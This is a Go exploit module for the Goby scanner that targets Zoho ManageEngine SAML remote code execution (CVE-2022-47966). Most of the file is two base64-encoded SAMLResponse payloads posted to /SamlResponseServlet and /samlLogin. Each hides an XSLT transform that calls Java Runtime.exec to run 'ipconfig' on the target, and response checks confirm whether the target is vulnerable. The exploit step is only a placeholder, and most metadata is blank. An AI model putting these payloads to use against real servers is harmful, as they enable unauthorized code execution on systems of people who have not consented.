package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
  "Name": "Zoho ManageEngine SAML 任意代码执行漏洞（CVE-2022-47966）",
  "Description": "",
  "Product": "",
  "Homepage": "",
  "DisclosureDate": null,
  "Author": "清晨",
  "FofaQuery": "body=\"ManageEngine\"",
  "GobyQuery": "body=\"ManageEngine\"",
  "Level": "2",
  "Impact": "",
  "Recommendation": "",
  "References": [],
  "Is0day": false,
  "HasExp": false,
  "ExpParams": [],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "OR",
    {
      "Request": {
        "method": "POST",
        "uri": "/SamlResponseServlet",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": "SAMLResponse=PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHNhbWxwOlJlc3BvbnNlCiAgSUQ9Il9lZGRjMWU1Zi04Yzg3LTRlNTUtODMwOS1jNmQ2OWQ2YzJhZGYiCiAgSW5SZXNwb25zZVRvPSJfNGIwNWU0MTRjNGYzN2U0MTc4OWI2ZWYxYmRhYWE5ZmYiCiAgSXNzdWVJbnN0YW50PSIyMDIzLTAxLTE2VDEzOjU2OjQ2LjUxNFoiIFZlcnNpb249IjIuMCIgeG1sbnM6c2FtbHA9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpwcm90b2NvbCI%2BCiAgPHNhbWxwOlN0YXR1cz4KICAgIDxzYW1scDpTdGF0dXNDb2RlIFZhbHVlPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6c3RhdHVzOlN1Y2Nlc3MiLz4KICA8L3NhbWxwOlN0YXR1cz4KICA8QXNzZXJ0aW9uIElEPSJfYjVhMmU5YWEtODk1NS00YWM2LTk0ZjUtMzM0MDQ3ODgyNjAwIgogICAgSXNzdWVJbnN0YW50PSIyMDIzLTAxLTE2VDEzOjU2OjQ2LjQ5OFoiIFZlcnNpb249IjIuMCIgeG1sbnM9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iPgogICAgPElzc3Vlcj5pc3N1ZXI8L0lzc3Vlcj4KICAgIDxkczpTaWduYXR1cmUgeG1sbnM6ZHM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyMiPgogICAgICA8ZHM6U2lnbmVkSW5mbz4KICAgICAgICA8ZHM6Q2Fub25pY2FsaXphdGlvbk1ldGhvZCBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMTAveG1sLWV4Yy1jMTRuIyIvPgogICAgICAgIDxkczpTaWduYXR1cmVNZXRob2QgQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzA0L3htbGRzaWctbW9yZSNyc2Etc2hhMjU2Ii8%2BCiAgICAgICAgPGRzOlJlZmVyZW5jZSBVUkk9IiNfYjVhMmU5YWEtODk1NS00YWM2LTk0ZjUtMzM0MDQ3ODgyNjAwIj4KICAgICAgICAgIDxkczpUcmFuc2Zvcm1zPgogICAgICAgICAgICA8ZHM6VHJhbnNmb3JtIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8xMC94bWwtZXhjLWMxNG4jIi8%2BCiAgICAgICAgICAgIDxkczpUcmFuc2Zvcm0gQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy9UUi8xOTk5L1JFQy14c2x0LTE5OTkxMTE2Ij4KICAgICAgICAgICAgICA8eHNsOnN0eWxlc2hlZXQgdmVyc2lvbj0iMS4wIgogICAgICAgICAgICAgICAgeG1sbnM6b2I9Imh0dHA6Ly94bWwuYXBhY2hlLm9yZy94YWxhbi9qYXZhL2phdmEubGFuZy5PYmplY3QiCiAgICAgICAgICAgICAgICB4bWxuczpydD0iaHR0cDovL3htbC5hcGFjaGUub3JnL3hhbGFuL2phdmEvamF2YS5sYW5nLlJ1bnRpbWUiIHhtbG5zOnhzbD0iaHR0cDovL3d3dy53My5vcmcvMTk5OS9YU0wvVHJhbnNmb3JtIj4KICAgICAgICAgICAgICAgIDx4c2w6dGVtcGxhdGUgbWF0Y2g9Ii8iPgogICAgICAgICAgICAgICAgICA8eHNsOnZhcmlhYmxlIG5hbWU9InJ0b2JqZWN0IiBzZWxlY3Q9InJ0OmdldFJ1bnRpbWUoKSIvPgogICAgICAgICAgICAgICAgICA8eHNsOnZhcmlhYmxlIG5hbWU9InByb2Nlc3MiIHNlbGVjdD0icnQ6ZXhlYygkcnRvYmplY3QsJ2lwY29uZmlnJykiLz4KICAgICAgICAgICAgICAgICAgPHhzbDp2YXJpYWJsZSBuYW1lPSJwcm9jZXNzU3RyaW5nIiBzZWxlY3Q9Im9iOnRvU3RyaW5nKCRwcm9jZXNzKSIvPgogICAgICAgICAgICAgICAgICA8eHNsOnZhbHVlLW9mIHNlbGVjdD0iJHByb2Nlc3NTdHJpbmciLz4KICAgICAgICAgICAgICAgIDwveHNsOnRlbXBsYXRlPgogICAgICAgICAgICAgIDwveHNsOnN0eWxlc2hlZXQ%2BCiAgICAgICAgICAgIDwvZHM6VHJhbnNmb3JtPgogICAgICAgICAgPC9kczpUcmFuc2Zvcm1zPgogICAgICAgICAgPGRzOkRpZ2VzdE1ldGhvZCBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMDQveG1sZW5jI3NoYTI1NiIvPgogICAgICAgICAgPGRzOkRpZ2VzdFZhbHVlPkg3Z0t1TzZ0OU1iQ0padWpBOVM3V2xMRmdkcU11TmUwMTQ1S1J3S2wwMDA9PC9kczpEaWdlc3RWYWx1ZT4KICAgICAgICA8L2RzOlJlZmVyZW5jZT4KICAgICAgPC9kczpTaWduZWRJbmZvPgogICAgICA8ZHM6U2lnbmF0dXJlVmFsdWU%2BUmJCV0I2QUlQOEFOMXdUWk42WVlDS2RuQ2xGb2g4R3FtVTJSWG95am1rcjZJMEFQMzcxSVM3anhTTVMyenhGQ2RaODBrSW52Z1Z1YUV0M3lRbWNxMzMvZDZ5R2VPeFpVN2tGMWYxRC9kYStvS21Fb2o0czZQUWN2YVJGTnArUmZPeE1FQ0JXVlRBeHpRaUgvT1Vtb0w3a3laVWhVd1A5RzhZazB0a3NvVjlwU0VYVW96U3ErSTVLRU40ZWhYVmpxbklqMDRtRjZaeDZjalBtNGhjaU5NdzFVQWZBTmhmcTdWQzV6ajZWYVFmejdMclk0R2xIb0FMTU1xZWJOWWtFa2YyTjFrREtpQUVLVmVQU28xdkhPMEFGKythbFFSSk80N2M4a2d6bGQxeHk1RUN2RGM3dVl3dURKbzNLWWs1aFE4TlN3dmFuYTdLZGxKZUQ2Mkd6UGx3PT08L2RzOlNpZ25hdHVyZVZhbHVlPgogICAgICA8ZHM6S2V5SW5mby8%2BCiAgICA8L2RzOlNpZ25hdHVyZT4KICA8L0Fzc2VydGlvbj4KPC9zYW1scDpSZXNwb25zZT4K"
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "not contains",
            "value": "FATAL: You are not authorized to use this service",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "not contains",
            "value": "Unknown error occurred while processing your request",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    },
    {
      "Request": {
        "method": "POST",
        "uri": "/samlLogin",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": "SAMLResponse=PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHNhbWxwOlJlc3BvbnNlCiAgSUQ9Il9lZGRjMWU1Zi04Yzg3LTRlNTUtODMwOS1jNmQ2OWQ2YzJhZGYiCiAgSW5SZXNwb25zZVRvPSJfNGIwNWU0MTRjNGYzN2U0MTc4OWI2ZWYxYmRhYWE5ZmYiCiAgSXNzdWVJbnN0YW50PSIyMDIzLTAxLTE2VDEzOjU2OjQ2LjUxNFoiIFZlcnNpb249IjIuMCIgeG1sbnM6c2FtbHA9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpwcm90b2NvbCI%2BCiAgPHNhbWxwOlN0YXR1cz4KICAgIDxzYW1scDpTdGF0dXNDb2RlIFZhbHVlPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6c3RhdHVzOlN1Y2Nlc3MiLz4KICA8L3NhbWxwOlN0YXR1cz4KICA8QXNzZXJ0aW9uIElEPSJfYjVhMmU5YWEtODk1NS00YWM2LTk0ZjUtMzM0MDQ3ODgyNjAwIgogICAgSXNzdWVJbnN0YW50PSIyMDIzLTAxLTE2VDEzOjU2OjQ2LjQ5OFoiIFZlcnNpb249IjIuMCIgeG1sbnM9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iPgogICAgPElzc3Vlcj5pc3N1ZXI8L0lzc3Vlcj4KICAgIDxkczpTaWduYXR1cmUgeG1sbnM6ZHM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyMiPgogICAgICA8ZHM6U2lnbmVkSW5mbz4KICAgICAgICA8ZHM6Q2Fub25pY2FsaXphdGlvbk1ldGhvZCBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMTAveG1sLWV4Yy1jMTRuIyIvPgogICAgICAgIDxkczpTaWduYXR1cmVNZXRob2QgQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzA0L3htbGRzaWctbW9yZSNyc2Etc2hhMjU2Ii8%2BCiAgICAgICAgPGRzOlJlZmVyZW5jZSBVUkk9IiNfYjVhMmU5YWEtODk1NS00YWM2LTk0ZjUtMzM0MDQ3ODgyNjAwIj4KICAgICAgICAgIDxkczpUcmFuc2Zvcm1zPgogICAgICAgICAgICA8ZHM6VHJhbnNmb3JtIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8xMC94bWwtZXhjLWMxNG4jIi8%2BCiAgICAgICAgICAgIDxkczpUcmFuc2Zvcm0gQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy9UUi8xOTk5L1JFQy14c2x0LTE5OTkxMTE2Ij4KICAgICAgICAgICAgICA8eHNsOnN0eWxlc2hlZXQgdmVyc2lvbj0iMS4wIgogICAgICAgICAgICAgICAgeG1sbnM6b2I9Imh0dHA6Ly94bWwuYXBhY2hlLm9yZy94YWxhbi9qYXZhL2phdmEubGFuZy5PYmplY3QiCiAgICAgICAgICAgICAgICB4bWxuczpydD0iaHR0cDovL3htbC5hcGFjaGUub3JnL3hhbGFuL2phdmEvamF2YS5sYW5nLlJ1bnRpbWUiIHhtbG5zOnhzbD0iaHR0cDovL3d3dy53My5vcmcvMTk5OS9YU0wvVHJhbnNmb3JtIj4KICAgICAgICAgICAgICAgIDx4c2w6dGVtcGxhdGUgbWF0Y2g9Ii8iPgogICAgICAgICAgICAgICAgICA8eHNsOnZhcmlhYmxlIG5hbWU9InJ0b2JqZWN0IiBzZWxlY3Q9InJ0OmdldFJ1bnRpbWUoKSIvPgogICAgICAgICAgICAgICAgICA8eHNsOnZhcmlhYmxlIG5hbWU9InByb2Nlc3MiIHNlbGVjdD0icnQ6ZXhlYygkcnRvYmplY3QsJ2lwY29uZmlnJykiLz4KICAgICAgICAgICAgICAgICAgPHhzbDp2YXJpYWJsZSBuYW1lPSJwcm9jZXNzU3RyaW5nIiBzZWxlY3Q9Im9iOnRvU3RyaW5nKCRwcm9jZXNzKSIvPgogICAgICAgICAgICAgICAgICA8eHNsOnZhbHVlLW9mIHNlbGVjdD0iJHByb2Nlc3NTdHJpbmciLz4KICAgICAgICAgICAgICAgIDwveHNsOnRlbXBsYXRlPgogICAgICAgICAgICAgIDwveHNsOnN0eWxlc2hlZXQ%2BCiAgICAgICAgICAgIDwvZHM6VHJhbnNmb3JtPgogICAgICAgICAgPC9kczpUcmFuc2Zvcm1zPgogICAgICAgICAgPGRzOkRpZ2VzdE1ldGhvZCBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMDQveG1sZW5jI3NoYTI1NiIvPgogICAgICAgICAgPGRzOkRpZ2VzdFZhbHVlPkg3Z0t1TzZ0OU1iQ0padWpBOVM3V2xMRmdkcU11TmUwMTQ1S1J3S2wwMDA9PC9kczpEaWdlc3RWYWx1ZT4KICAgICAgICA8L2RzOlJlZmVyZW5jZT4KICAgICAgPC9kczpTaWduZWRJbmZvPgogICAgICA8ZHM6U2lnbmF0dXJlVmFsdWU%2BUmJCV0I2QUlQOEFOMXdUWk42WVlDS2RuQ2xGb2g4R3FtVTJSWG95am1rcjZJMEFQMzcxSVM3anhTTVMyenhGQ2RaODBrSW52Z1Z1YUV0M3lRbWNxMzMvZDZ5R2VPeFpVN2tGMWYxRC9kYStvS21Fb2o0czZQUWN2YVJGTnArUmZPeE1FQ0JXVlRBeHpRaUgvT1Vtb0w3a3laVWhVd1A5RzhZazB0a3NvVjlwU0VYVW96U3ErSTVLRU40ZWhYVmpxbklqMDRtRjZaeDZjalBtNGhjaU5NdzFVQWZBTmhmcTdWQzV6ajZWYVFmejdMclk0R2xIb0FMTU1xZWJOWWtFa2YyTjFrREtpQUVLVmVQU28xdkhPMEFGKythbFFSSk80N2M4a2d6bGQxeHk1RUN2RGM3dVl3dURKbzNLWWs1aFE4TlN3dmFuYTdLZGxKZUQ2Mkd6UGx3PT08L2RzOlNpZ25hdHVyZVZhbHVlPgogICAgICA8ZHM6S2V5SW5mby8%2BCiAgICA8L2RzOlNpZ25hdHVyZT4KICA8L0Fzc2VydGlvbj4KPC9zYW1scDpSZXNwb25zZT4K"
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "not contains",
            "value": "Unknown",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "ExploitSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "/test.php",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "test",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "Tags": [],
  "VulType": [],
  "CVEIDs": [
    ""
  ],
  "CNNVD": [
    ""
  ],
  "CNVD": [
    ""
  ],
  "CVSSScore": "",
  "Translation": {
    "CN": {
      "Name": "Zoho ManageEngine SAML 任意代码执行漏洞（CVE-2022-47966）",
      "Product": "",
      "Description": "",
      "Recommendation": "",
      "Impact": "",
      "VulType": [],
      "Tags": []
    },
    "EN": {
      "Name": "Zoho ManageEngine SAML rce CVE-2022-47966",
      "Product": "",
      "Description": "",
      "Recommendation": "",
      "Impact": "",
      "VulType": [],
      "Tags": []
    }
  },
  "AttackSurfaces": {
    "Application": null,
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}